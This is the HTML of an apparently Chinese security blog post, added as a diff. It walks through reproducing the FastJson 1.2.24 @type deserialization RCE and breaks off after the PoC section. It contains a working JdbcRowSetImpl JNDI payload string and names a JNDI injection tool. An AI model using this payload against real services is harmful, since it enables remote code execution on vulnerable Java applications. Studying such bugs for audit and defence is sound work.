@@ -1,0 +1,1182 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析 - 欢迎入侵本站</title>
+
+  
+    <meta name="description" content="本文从环境搭建出发，一步一步分析 FastJson 反序列化 RCE 的完整利用链，并结合调试断点深入分析底层代码执行逻辑。   目录 漏洞背景 环境准备 搭建 Maven 项目 FastJson @type 机制初探（User 例子） parseObject 两种调用方式的本质区别 PoC 复现：JdbcRowSetImpl 利用链 底层代码调试分析 完整漏洞链路总结 修复建议   一、漏洞背">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析">
+<meta property="og:url" content="https://wr0ld.github.io/posts/3035988a/">
+<meta property="og:site_name" content="欢迎入侵本站">
+<meta property="og:description" content="本文从环境搭建出发，一步一步分析 FastJson 反序列化 RCE 的完整利用链，并结合调试断点深入分析底层代码执行逻辑。   目录 漏洞背景 环境准备 搭建 Maven 项目 FastJson @type 机制初探（User 例子） parseObject 两种调用方式的本质区别 PoC 复现：JdbcRowSetImpl 利用链 底层代码调试分析 完整漏洞链路总结 修复建议   一、漏洞背">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-03-24T06:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-26T08:20:28.862Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="FastJson">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="代码审计,Java,RCE,FastJson">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-24T14:00:00+08:00","dateModified":"2026-03-26T16:20:28+08:00","datePublished":"2026-03-24T14:00:00+08:00","description":"","headline":"代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/3035988a/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/3035988a/","keywords":"代码审计, Java, RCE, FastJson","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image5.png","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">欢迎入侵本站</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报</span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">cs魔改</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">fastjson代码审计（1.2.68 → 1.2.80）</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">java cc链</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">信息收集方法论</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">EDUSRC实战漏洞挖掘复盘（脱敏）</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-status">🔄</span><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-03-24T06:00:00.000Z">2026-03-24</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-03-26T08:20:28.862Z">2026-03-26</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>代码审计 | FastJson 1.2.24 反序列化 RCE 漏洞分析</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><blockquote>
+<p>本文从环境搭建出发，一步一步分析 FastJson 反序列化 RCE 的完整利用链，并结合调试断点深入分析底层代码执行逻辑。</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li><a href="#%E4%B8%80%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF">漏洞背景</a></li>
+<li><a href="#%E4%BA%8C%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">环境准备</a></li>
+<li><a href="#%E4%B8%89%E6%90%AD%E5%BB%BA-maven-%E9%A1%B9%E7%9B%AE">搭建 Maven 项目</a></li>
+<li><a href="#%E5%9B%9Bfastjson-type-%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2user-%E4%BE%8B%E5%AD%90">FastJson @type 机制初探（User 例子）</a></li>
+<li><a href="#%E4%BA%94parseobject-%E4%B8%A4%E7%A7%8D%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8C%BA%E5%88%AB">parseObject 两种调用方式的本质区别</a></li>
+<li><a href="#%E5%85%ADpoc-%E5%A4%8D%E7%8E%B0jdbcrowsetimpl-%E5%88%A9%E7%94%A8%E9%93%BE">PoC 复现：JdbcRowSetImpl 利用链</a></li>
+<li><a href="#%E4%B8%83%E5%BA%95%E5%B1%82%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">底层代码调试分析</a></li>
+<li><a href="#%E5%85%AB%E5%AE%8C%E6%95%B4%E6%BC%8F%E6%B4%9E%E9%93%BE%E8%B7%AF%E6%80%BB%E7%BB%93">完整漏洞链路总结</a></li>
+<li><a href="#%E4%B9%9D%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">修复建议</a></li>
+</ol>
+<hr>
+<h2 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a>一、漏洞背景</h2><p>FastJson 是阿里巴巴开源的高性能 JSON 解析库，广泛用于 Java 后端项目。</p>
+<p><strong>漏洞版本：≤ 1.2.24</strong></p>
+<p>核心原因是 <code>@type</code> 字段允许任意类加载，攻击者可以通过在 JSON 数据中指定恶意类，触发该类的危险方法，最终实现远程代码执行（RCE）。</p>
+<p>简单来说，FastJson 在解析 JSON 的时候，如果发现有 <code>@type</code> 这个字段，它会把里面的值当作类名，直接去加载这个类——而且没有任何白名单限制。这个设计在 1.2.24 及以下版本是完全开放的，给了攻击者可乘之机。</p>
+<hr>
+<h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><p><strong>测试环境：</strong></p>
+<ul>
+<li><p>JDK：<code>java 8u64</code></p>
+<blockquote>
+<p>⚠️ 这里必须用低版本 JDK，原因很关键：从 JDK 8u191 开始，Java 对 JNDI 远程类加载做了限制（<code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认设为 <code>false</code>），也就是说高版本 JDK 直接阻断了通过 RMI 加载远程恶意类这条路。所以要复现这个漏洞，必须用 8u191 以下的版本。</p>
+</blockquote>
+</li>
+<li><p>FastJson 版本：<code>1.2.24</code></p>
+</li>
+</ul>
+<p><strong>相关资源：</strong></p>
+<ul>
+<li>JNDI 注入利用工具：<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code></li>
+<li>FastJson 1.2.24 依赖：<a target="_blank" rel="noopener" href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.24/</a></li>
+<li>FastJson 1.2.27（对比参考）：<a target="_blank" rel="noopener" href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.27/">https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.27/</a></li>
+</ul>
+<hr>
+<h2 id="三、搭建-Maven-项目"><a href="#三、搭建-Maven-项目" class="headerlink" title="三、搭建 Maven 项目"></a>三、搭建 Maven 项目</h2><h3 id="第一步：建-Maven-项目"><a href="#第一步：建-Maven-项目" class="headerlink" title="第一步：建 Maven 项目"></a>第一步：建 Maven 项目</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image1.png"></p>
+<h3 id="第二步：添加-FastJson-依赖"><a href="#第二步：添加-FastJson-依赖" class="headerlink" title="第二步：添加 FastJson 依赖"></a>第二步：添加 FastJson 依赖</h3><p>在 <code>pom.xml</code> 的 <code>&lt;/properties&gt;</code> 后面加入以下依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第三步：下载依赖"><a href="#第三步：下载依赖" class="headerlink" title="第三步：下载依赖"></a>第三步：下载依赖</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image2.png"></p>
+<p>依赖下载成功后可以看到：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image3.png"></p>
+<hr>
+<h2 id="四、FastJson-type-机制初探（User-例子）"><a href="#四、FastJson-type-机制初探（User-例子）" class="headerlink" title="四、FastJson @type 机制初探（User 例子）"></a>四、FastJson @type 机制初探（User 例子）</h2><p>在正式打漏洞之前，先搞懂 <code>@type</code> 到底是干什么的，用一个简单的自定义类来演示。</p>
+<h3 id="4-1-创建-User-类"><a href="#4-1-创建-User-类" class="headerlink" title="4.1 创建 User 类"></a>4.1 创建 User 类</h3><p>新建文件 <code>src/main/java/org/example/User.java</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image6.png"></p>
+<p>代码内容如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getGender&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(String gender)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">        System.out.println(<span class="string">&quot;setGender&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-修改-Main-java-测试解析"><a href="#4-2-修改-Main-java-测试解析" class="headerlink" title="4.2 修改 Main.java 测试解析"></a>4.2 修改 Main.java 测试解析</h3><p>在 <code>src/main/java/org/example/Main.java</code> 中修改代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">Test</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,&quot;</span> +</span><br><span class="line">              <span class="string">&quot;\&quot;name\&quot;:\&quot;wrold\&quot;,&quot;</span> +</span><br><span class="line">              <span class="string">&quot;\&quot;age\&quot;:18&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">date</span> <span class="operator">=</span> JSON.parseObject(Test);</span><br><span class="line">System.out.println(date);</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-运行结果"><a href="#4-3-运行结果" class="headerlink" title="4.3 运行结果"></a>4.3 运行结果</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image7.png"></p>
+<p>可以看到：</p>
+<ul>
+<li><code>@type</code> 指向的是我们自己创建的类文件</li>
+<li>JSON 数据包含了 <code>name</code> 和 <code>age</code> 两个参数</li>
+<li>在运行结果里，触发了 <code>setName</code>、<code>setAge</code>、<code>getAge</code>、<code>getName</code></li>
+<li>虽然没有定义 <code>gender</code> 参数，但仍然触发了 <code>getGender</code></li>
+</ul>
+<hr>
+<h2 id="五、parseObject-两种调用方式的本质区别"><a href="#五、parseObject-两种调用方式的本质区别" class="headerlink" title="五、parseObject 两种调用方式的本质区别"></a>五、parseObject 两种调用方式的本质区别</h2><p>如果把：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">date</span> <span class="operator">=</span> JSON.parseObject(Test);</span><br></pre></td></tr></table></figure>
+
+<p>改成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(test, User.class);</span><br></pre></td></tr></table></figure>
+
+<p>运行结果就不一样了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/fastjson_image8.png"></p>
+<p><code>JSON.parseObject(test, User.class)</code> 只触发了 setter，没有触发任何 getter。</p>
+<p><strong>两种调用方式的本质区别：</strong></p>
+<table>
+<thead>
+<tr>
+<th>调用方式</th>
+<th>触发方法</th>
+<th>返回类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>JSON.parseObject(test)</code></td>
+<td>setter + getter</td>
+<td>JSONObject</td>
+</tr>
+<tr>
+<td><code>JSON.parseObject(test, User.class)</code></td>
+<td>只有 setter</td>
+<td>User 对象</td>
+</tr>
+</tbody></table>
+<p><strong>这个区别在漏洞利用里非常关键：</strong></p>
+<ul>
+<li><strong>setter 型利用链</strong> → 两种调用方式都能触发，<code>JdbcRowSetImpl</code> 就是这种</li>
+<li><strong>getter 型利用链</strong> → 只有 <code>parseObject(test)</code> 无类型版本才能触发，<code>TemplatesImpl</code> 的 <code>getOutputProperties</code> 就是典型</li>
+</ul>
+<hr>
+<h2 id="六、PoC-复现：JdbcRowSetImpl-利用链"><a href="#六、PoC-复现：JdbcRowSetImpl-利用链" class="headerlink" title="六、PoC 复现：JdbcRowSetImpl 利用链"></a>六、PoC 复现：JdbcRowSetImpl 利用链</h2><h3 id="6-1-为什么用-JdbcRowSetImpl？"><a href="#6-1-为什么用-JdbcRowSetImpl？" class="headerlink" title="6.1 为什么用 JdbcRowSetImpl？"></a>6.1 为什么用 JdbcRowSetImpl？</h3><p><code>JdbcRowSetImpl</code> 是 JDK 自带的 JDBC 行集实现类。它的 <code>setDataSourceName</code> 和 <code>setAutoCommit</code> 方法组合可以触发 JNDI 查询，是 FastJson 漏洞利用中最经典的 <strong>setter 型利用类</strong>——不需要依赖任何第三方库，JDK 自带，通用性极强。</p>
+<p>利用逻辑很简单：</p>
+<ol>
+<li><code>setDataSourceName</code> → 存入 RMI 地址</li>
+<li><code>setAutoCommit</code> → 触发 JNDI lookup，连接恶意 RMI 服务</li>
+<li>RMI 服务返回恶意类 → 加载执行 → RCE</li>
+</ol>
+<h3 id="6-2-编写-Payload"><a href="#6-2-编写-Payload" class="headerlink" title="6.2 编写 Payload"></a>6.2 编写 Payload</h3><p>在 <code>src/main/java/org/example/Main.java</code> 中添加代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +</span><br><span class="line">                         <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/exploit\&quot;,&quot;</span> +</span><br><span class="line">                         <span class="string">&quot;\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
